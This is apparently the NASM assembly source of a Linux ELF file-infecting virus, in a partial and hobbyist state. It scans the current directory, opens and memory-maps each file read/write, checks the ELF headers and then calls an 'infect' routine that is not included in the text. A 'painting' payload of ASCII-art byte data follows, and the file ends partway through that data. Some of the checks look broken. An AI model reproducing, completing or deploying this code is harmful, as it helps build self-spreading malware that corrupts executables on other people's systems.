BITS 64

section .bss
	struc linuxdirent
		.d_ino:			resq 1
		.d_off:			resq 1
		.d_reclen:		resb 2
		.d_nameq:		resb 1
		.d_type:		resb 1
	endstruc
	
	struc filestat
		.st_dev			resq 1	;ID of dev containing file
		.st_ino			resq 1	;inode #
		.st_mode		resd 1	;pn
		.st_nlink		resd 1	;# of hard links
		.st_uid			resd 1	;user id of owner
		.st_gid			resd 1	;group Id of owner
		.st_rdev		resq 1 	;dev ID 
		.st_pad1		resq 1 	;padding 
		.st_size		resd 1	;total size in bytes
		.st_blksize		resq 1	; blocksize for fs i/o
		.st_pad2		resd 1	;padding
		.st_blocks		resq 1	;# of 512b blocks allocated
		.st_atime		resq 1	;time of last file access
		.st_mtime		resq 1	;time of last file mod
		.st_ctime		resq 1	;time of last file status change
	endstruc

	struc elf_ehdr
		.e_ident		resd 1		; unsigned char
		.ei_class		resb 1		; 
		.ei_data		resb 1		; 
		.ei_version		resb 1		; 
		.ei_osabi		resb 1		; 
		.ei_abiversion	resb 1		; 
		.ei_padding		resb 6		; bytes 9-14
		.ei_nident		resb 1		; size of ident array
		.e_type			resb 2		; uint16_t, bytes 16-17
		.e_machine		resb 2		; uint16_t, bytes 18-19
		.e_version		resw 1		; uint32_t
		.e_entry		resq 1		; ElfN_Addr
        .e_phoff		resq 1		; ElfN_Off 
        .e_shoff		resq 1		; ElfN_Off 
        .e_flags		resw 1		; uint32_t 
        .e_ehsize		resb 2		; uint16_t 
        .e_phentsize	resb 2		; uint16_t 
        .e_phnum		resb 2		; uint16_t 
        .e_shentsize	resb 2		; uint16_t 
        .e_shnum		resb 2		; uint16_t 
        .e_shstrndx		resb 2		; uint16_t 
	endstruc

	struc elf_phdr
		.p_type			resd 1		;  uint32_t   
		.p_flags		resd 1		;  uint32_t   
		.p_offset		resq 1		;  Elf64_Off  
		.p_vaddr		resq 1		;  Elf64_Addr 
		.p_paddr		resq 1		;  Elf64_Addr 
		.p_filesz		resq 1		;  uint64_t   
		.p_memsz		resq 1		;  uint64_t   
		.p_align		resq 1		;  uint64_t   
	endstruc

	struc elf_shdr
    	.sh_name		resw 1		; uint32_t   
    	.sh_type		resw 1		; uint32_t   
    	.sh_flags		resq 1		; uint64_t   
    	.sh_addr		resq 1		; Elf64_Addr 
     	.sh_offset		resq 1		; Elf64_Off  
     	.sh_size		resq 1		; uint64_t   
     	.sh_link		resw 1		; uint32_t   
     	.sh_info		resw 1		; uint32_t   
     	.sh_addralign	resq 1		; uint64_t   
     	.sh_entsize		resq 1		; uint64_t   
	endstruc



section .data

;x64 syscall reference

SYS_READ 		equ 0x0
SYS_WRITE 		equ 0x1
SYS_OPEN 		equ 0x2
SYS_CLOSE 		equ 0x3
SYS_FSTAT 		equ 0x5
SYS_MMAP 		equ 0x9
SYS_MUNMAP		equ 0xB
SYS_PREAD64 	equ 0x11
SYS_PWRITE64 	equ 0x12
SYS_EXIT		equ 0x3c
SYS_GETDENTS64	equ 0x4e
SYS_CREAT		equ 0x55


PAGESIZE equ 4096	


teststr db 'boo', 13,10,0
teststrlen equ $-teststr

targetdir db '.',0
targetdirlen equ $-targetdir


;****************************************************************************************
; debug strings
;
;****************************************************************************************

checkelfpass db 'File is an ELF!', 13, 10, 0
checkelfpasslen equ $-checkelfpass

checkelffail db 'File is not an ELF!', 13, 10, 0
checkelffaillen equ $-checkelffail

checkfile_dtreg_fail db 'File is not a DTREG file!', 13, 10, 0
checkfiledtreg_fail_len equ $-checkfile_dtreg_fail

checkelf_etype_fail db 'e_type is not DYN or EXEC... boo :( ', 13, 10, 0
checkelf_etype_faillen equ $-checkelf_etype_fail

check64pass db 'File is an ELFCLASS64!', 13, 10, 0
check64passlen equ $-check64pass
check64fail db 'File is not an ELFCLASS64 booo :( going to next one', 13, 10, 0
check64faillen equ $-check64fail

checkarchpass db 'File is compiled for x86-64!', 13, 10, 0
checkarchpasslen equ $-checkarchpass
checkarchfail db 'File is not compiled for x86-64 booo :( going to next one', 13, 10, 0
checkarchfaillen equ $-checkarchfail

checkphdrstart db 'Beginning of phdr_loop', 13,10,0
checkphdrstartlen equ $-checkphdrstart

checkptloadpass db 'Segment is PT_LOAD!', 13, 10, 0
checkptloadpasslen equ $-checkptloadpass
checkptloadfail db 'Segment is not PT_LOAD :( going to next one', 13, 10, 0
checkptloadfaillen equ $-checkptloadfail

;****************************************************************************************

;variables used for phdr and shdr manipulation routines

evaddr: dq 0
oshoff: dq 0
vxhostentry: dq 0
vxoffset: dq 0
ventry equ $_start 

fd:	dq 0
;fdlen equ $-fd
;framebuffer:
;	db `//dev//fb0`,0
;framebuflen equ $-framebuffer
;;

STDOUT			equ 0x1

;open() syscall parameter reference 
OPEN_RDWR		equ 0x2
O_WRONLY		equ 0x1
O_RDONLY		equ 0x0


O_CREAT			equ 100o
O_TRUNC			equ 1000o
O_APPEND		equ 2000o

S_IFREG    		dq 0x0100000   ;regular file
S_IFMT 			dq 0x0170000

;mode 		dd 0
;S_ISREG		equ (mode & S_IFMT)
;;%define S_ISREG(x)	(x&S_IFMT==S_IFREG)
;%define S_ISREG(x)	x & S_IFMT
;;see: https://stackoverflow.com/questions/40163270/what-is-s-isreg-and-what-does-it-do#:~:text=S_ISREG()%20is%20a%20macro,stat)%20is%20a%20regular%20file


PROT_READ		equ 0x1
PROT_WRITE		equ 0x2
MAP_PRIVATE		equ 0x2

;ELF header vals
ELFCLASS64 		equ 0x2
ETYPE_DYN		equ 0x3
ETYPE_EXEC		equ 0x2
ELFX8664		equ 0x3e

;D_TYPE values
DT_REG 			equ 0x8

;PHDR vals
PT_LOAD 		equ 0x0100

MAX_RDENT_BUF	times 0x800 db 0 
MAX_RDENT_BUF_SIZE equ 0x800

;num_dir_entries resq 0x0
;root_dirent:	dq 0 

;;file pointed to by fstat is fd


section .text
global _start
_start:
	push rbp
	mov rbp, rsp
	sub rsp, 0x1000
	mov r14, rsp

_getdirents:
;****************************************************************************************
; open - syscall 0x2
;;open(filename, flags, mode);
;;rdi == filename
;;rsi == flags
;rdx == mode
;; returns: fd (in rax, obv)
;****************************************************************************************
	mov rdi, targetdir
	xor rsi, rsi 		;no flags
	add rsi, 0x02000000
	mov rdx, O_RDONLY	;open read-only
	mov rax, SYS_OPEN
	syscall
	
	mov r9, rax						;fd into r9
;****************************************************************************************
; getdents64 - syscall 0x4e
;; getdents(unsigned int fd, struct linuxdirent *dirent, unsigned int count);
;;rdi == fd
;;rsi == *dirent
;rdx == count
;returns # entries in rax
;[r14 v+ 600 +dirent] holds the pointer to the first dirent struct
;so we can iterate through all dirent entries using the size field in this dirent struc
;as an offset for successive jumps in address space	
;****************************************************************************************
	mov rdi, rax
	lea rsi, [r14 + 600 + linuxdirent] ;r14 + 600 is location on the stack where we'll save our dirent struct
	mov rdx, MAX_RDENT_BUF_SIZE
	mov rax, SYS_GETDENTS64
	syscall


	mov r8, rax						;save # of dirent entries in r8
	mov qword [r14 + 500], rax		;also save # of dir entries to local var on stack
;****************************************************************************************
; close - syscall 0x3
;;close(fd);
;;rdi == fd (file descriptor)
;; returns: 0 on success (-1 on error)
;****************************************************************************************
	mov rdi, r9
	mov rax, SYS_CLOSE
	syscall
	
	xor rcx, rcx	
	jmp check_file
	
;****************************************************************************************
; write - syscall 0x1
;;rdi == fd (file descriptor)
;;rsi == const char* buf
;rdx == count (# of bytes to write)
;; returns: 0 on success (-1 on error)
;
;	these routines are used for the bulk of the debug string printing
;
;****************************************************************************************
;	lea rsi,  [r14 + 600 + linuxdirent.d_nameq]
;	lea rdi, [r14 + 200] 
;	test_copy_filename:
;		movsb
;		cmp byte [rsi], 0x0
;		jne test_copy_filename
;	lea r13, [r14 + 200]
;	call _write

_write:
		xor rsi, rsi
		mov rdx, r12
		mov rsi, r13
		mov rdi, STDOUT
		mov rax, SYS_WRITE
		syscall
		ret
	
printteststr:
		lea rsi, teststr
		mov rdi, STDOUT
		mov rdx, teststrlen
		mov rax, SYS_WRITE
		syscall
		jmp _restore		

;****************************************************************************************
;check_file:
;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
;	upon successful mmap, close file
;	use mmaped file for checks to confirm that the target file satisfies the following:
;	1. the target file is an executable
;	2. the target file is an ELF
;	3. the target file is a 64-bit ELF
;	4. (optional, but requirement for rn): the target file is for x86_64 arch
;	5. the target file is not already infected (check w signature at known offset)
;	*If all of the following above conditions hold, then call the infection routine
;	Otherwise, continue looping through the remaining files in the directory
;
;****************************************************************************************
check_file:
	push rcx
	;nvm d_type might not be available; use the macros for fstat instead
	check_elf:
		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
		xor rdx, rdx						;mode - 0
		mov rax, SYS_OPEN
		syscall

		cmp rax, 0
		jb checknext
		
		mov r9, rax
		mov r8, rax
		mov [r14 + 144], rax
		;mov [fd], rax
		
		xor r12, r12
		lea rdi, [r14 + 200] 
		lea rsi, [rcx + r14 + 600 + linuxdirent.d_nameq]
		.copy_filename:
			movsb
			inc r12
			cmp byte [rsi], 0x0
			jne .copy_filename

		;debug print check
		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
		;lea r13, [r14 + 200]
		;call _write
		xor rax, rax
;		mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
	
		push r9
	check_filename:
		cmp qword [r14+200], "."
		je checknext

;	read_elf_header:
		;mov rdi, [fd]
;		mov rdi, r9
	;	lea rsi, [elf_header]
;		lea rsi, [r14 + elf_ehdr]
;		mov rdx, 64
;		xor r10, r10
;		mov rax, SYS_PREAD64
;		syscall
	
	get_filestat:
									;size for mmap == e_shoff + (e_shnum * e_shentsize)
		lea rsi, [r14 + filestat]	;or retrieve size from filestat struct with an fstat syscall
		mov rdi, r8
		mov rax, SYS_FSTAT
		syscall

		;tbqf extracting this field and checking it is an infuriating piece of logic that is not working as expected
		; since this is so annoying, I'm skipping this check for rn
	
		;mov r12, checkfiledtreg_fail_len
		;lea r13, checkfile_dtreg_fail
		
		;mov r10, [r14 + file_stat.st_mode]
		;mov [mode], r10
		;mov r10, S_ISREG(r10)
		;cmp S_ISREG, S_IFREG	
		;cmp r10, 0x1
		;mov rax, [r14+file_stat.st_mode]
		;and r10, [S_IFMT]
		;mov r9, [S_IFREG]
		;cmp r10, r9
		
		
		;jne checknext
		
		;void *mmap(void addr[.length], size_t length, int prot, int flags,
		;                  int fd, off_t offset);
	mmap_file:
		xor rdi, rdi			;set RDI to NULL
		mov rsi, [r14 + filestat.st_size]
		mov rdx, 0x3 			; (PROT_READ | PROT_WRITE)
		mov r10, MAP_PRIVATE
		;mov r8, fd				;fd is already in r8 so we don't need to set that reg again
		xor r9, r9				;offset of 0 within file == start of file, obv	
		mov rax, SYS_MMAP
		syscall
		
		cmp rax, 0
		jb checknext
		pop r9
	
		mov r8, rax
		mov [r14 + 800], rax			;rax contains address of new mapping upon return from syscall
		push rax

	close_curr_file:
		mov rdi, r9
		mov rax, SYS_CLOSE
		syscall
	
		pop rax
		test rax, rax
		js checknext
	check_elf_header_etype:
		lea r13, checkelf_etype_fail
		mov r12, checkelf_etype_faillen
		cmp word [rax + elf_ehdr.e_type], 0x0002
		je check_elf_header_magic_bytes
		cmp word [rax + elf_ehdr.e_type], 0x0003
		je check_elf_header_magic_bytes
		jnz checknext

	check_elf_header_magic_bytes:
		;debug print check
		;lea r13, checkelffail
		;mov r12, checkelffaillen
		
		cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
		jnz checknext
		
		;debug print check
;		lea r13, checkelfpass
;		mov r12, checkelfpasslen
;		call _write
	
	check_elf_header_64bit:
		;debug print check
		;lea r13, check64fail
		;mov r12, check64faillen
		cmp byte [rax + elf_ehdr.e_ident+4], ELFCLASS64
		jne checknext
		
		;debug print check
		;lea r13, check64pass
		;mov r12, check64passlen
		;call _write
		jmp ready2infect
	
	check_elf_header_arch:
		lea r13, checkarchfail
		mov r12, checkarchfaillen
		;cmp byte [elf_header+18], 0x3e
		;cmp byte [rax + elf_ehdr +18], 0x3e
		cmp byte [r14+800+elf_ehdr + 18], ELFX8664
		;cmp byte [rax + elf_ehdr.e_machine], 0x3e
		;cmp word [rax + elf_ehdr.e_machine], 0x03e
		jne checknext
		
		;debug print check
		;lea r13, checkarchpass
		;mov r12, checkarchpasslen
		;call _write
		
	ready2infect:
		push rax
		;mov [r14 + 0xa00], rax
		call infect	
		jmp painting



	checknext:
		;mov r12, checkfiledtreg_fail_len
		;lea r13, checkfile_dtreg_fail
		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
		call _write
		
		mov rdi, fd
		mov rsi, [r14 + filestat.st_size]
		mov rax, SYS_MUNMAP
		syscall
		
		pop rcx
		add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
		cmp qword rcx, [r14 + 500]
		jne check_file
		jmp _restore




	painting:
	call payload
		db 0x2a,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a,0x25
		db 0xa,0x50,0x50,0x50,0x50,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x50,0x2a,0x2a,0x2a,0x2a,0x2a,0x2a
		db 0x2a,0xa,0x50,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50,0x50,0x50,0x50,0x50,0x2a
		db 0x2a,0x2a,0xa,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x2b,0x50,0x50
		db 0x50,0x50,0x50,0xa,0x2b,0x2b,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x59,0x59,0x2b,0x50,0x50,0x50,0x2b,0x2b,0x59,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0x2b,0x2b,0x2b,0x2b
		db 0x2b,0x2b,0x50,0x50,0xa,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x50,0x2a,0x50,0x2b,0x2b,0x2b,0x59,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x59,0x2b
		db 0x2b,0x2b,0x2b,0x2b,0x2b,0xa,0x59,0x59,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x50,0x50,0x50,0x50,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0x59,0x59
		db 0x59,0x59,0x59,0x59,0x2b,0x2b,0xa,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2b,0x50,0x50,0x2b,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24
		db 0x59,0x59,0x59,0x59,0x59,0x59,0x2b,0xa,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2b,0x2b,0x59,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x59,0x59,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2a,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0x59,0xa,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x24,0x2c,0x2a,0x2a,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0x59,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2b,0x25,0x50,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x59,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2c,0x2c,0x2a,0x2a,0x2b,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x59,0x59,0x24,0x24,0x2c,0x24,0x24,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2a,0x50,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2b,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x59,0x2c,0x2c,0x25,0x2a,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x2b,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2c,0x24,0x50,0x2b,0x59,0x59,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x24,0x2b,0x2b,0x59,0x24,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x2c,0x24,0x24,0x2b,0x59,0x24,0x2c,0x24,0x59,0x59,0x24,0x24,0x24,0x24,0x2b,0x24,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x24,0x2a,0x25,0x44,0x44,0x2a,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2b,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x2c,0x24,0x24,0x2c,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x59,0x2b,0x44,0x25,0x25,0x2a,0x2a,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x2b,0x59,0x59,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x50,0x25,0x25,0x50,0x2b,0x24,0x2c,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2b,0x50,0x2b,0x59,0x24,0x59,0x50,0x59,0x2c,0x2c,0x2c,0x59
		db 0x59,0x50,0x24,0x24,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x2c,0x24,0x24,0x24,0x24,0x59,0x24,0x2c,0x2c,0x2c,0x24,0x2c,0x2e,0x2c,0x59,0x2b,0x2c,0x2c,0x2c,0x24,0x2b,0x50,0x24,0x2c,0x2b,0x24,0x24,0x2c,0x2c,0x59,0x50,0x2b,0x59
		db 0x2b,0x2b,0x24,0x24,0x24,0x2c,0x2c,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x24,0x24,0x2c,0x2c,0x59,0x2c,0x2e,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0x24,0x24,0x59,0x2a,0x2b,0x24,0x59,0x2b,0x59,0x59,0x24,0x24,0x24,0x59
		db 0x59,0x24,0x24,0x24,0x24,0x59,0x2c,0x2e,0x2c,0x24,0x59,0x59,0x24,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x2c,0x2a,0x2a,0x59,0x2c,0x2e,0x2e,0x2e,0x2c,0x2e,0x2c,0x24,0x59,0x50,0x2b,0x59,0x50,0x50,0x50,0x2b,0x50,0x2b
		db 0x59,0x24,0x59,0x2b,0x2a,0x50,0x50,0x59,0x2c,0x2e,0x2c,0x2c,0x24,0x2b,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2e,0x2e,0x2c,0x24,0x2c,0x2c,0x2c,0x2a,0x2a,0x2a,0x50,0x24,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x2c,0x24,0x2c,0x2c,0x24,0x24,0x24,0x24,0x59
		db 0x2a,0x2a,0x2a,0x50,0x59,0x59,0x59,0x24,0x24,0x24,0x2c,0x2e,0x2c,0x2c,0x24,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x24,0x59,0x24,0x24,0x2c,0x2c,0x2c,0x2e,0x2c,0x2b,0x50,0x2a,0x4a,0x44,0x25,0x2a,0x2a,0x50,0x50,0x2b,0x50,0x50,0x24,0x2c,0x24,0x24,0x2c,0x2c
		db 0x24,0x2b,0x2b,0x2b,0x24,0x2c,0x2e,0x2e,0x2c,0x2c,0x59,0x2c,0x2e,0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x59,0x59,0x59,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x24,0x59,0x2c,0x2e,0x2e,0x2e,0x2e,0x24,0x2b,0x2b,0x2a,0x2a,0x2a,0x50,0x50,0x2b,0x2b,0x2b,0x2b,0x59,0x2c,0x24,0x24,0x59,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x24,0x59,0x24,0x2e,0x2e,0x2e,0x2c,0x24,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x2e,0x2c,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2e,0x2e,0x2c,0x24,0x2e,0x2e
		db 0x2e,0x2e,0x2e,0x2e,0x2e,0x24,0x2c,0x2c,0x24,0x2c,0x2e,0x2e,0x2c,0x59,0x59,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2e,0x2e,0x2e,0x2c,0x2c,0x24,0x2b,0x2a,0x50,0x2b,0x50,0x2b,0x2b,0x2b,0x59,0x24,0x24,0x24,0x24,0x24,0x24,0x2c,0x24,0x2c,0x24,0x59,0x24,0x2e
		db 0x2e,0x2e,0x2e,0x2e,0x2c,0x2c,0x2c,0x2e,0x2c,0x59,0x59,0x59,0x24,0x2c,0x2c,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2e,0x2c,0x59,0x2b,0x50,0x50,0x50,0x50,0x2b,0x2a,0x50,0x2b,0x59,0x59,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x24,0x24,0x2c
		db 0x2c,0x2c,0x2c,0x2c,0x24,0x2c,0x2c,0x2e,0x2e,0x24,0x24,0x24,0x24,0x2c,0x2c,0x24,0x2b,0x24,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x24,0x24,0xa,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x2c,0x24,0x50,0x50,0x2b,0x2b,0x50,0x50,0x2b,0x24,0x24,0x24,0x59,0x2b,0x24,0x2c,0x24,0x59,0x2c,0x2c,0x59,0x24,0x2c,0x2c
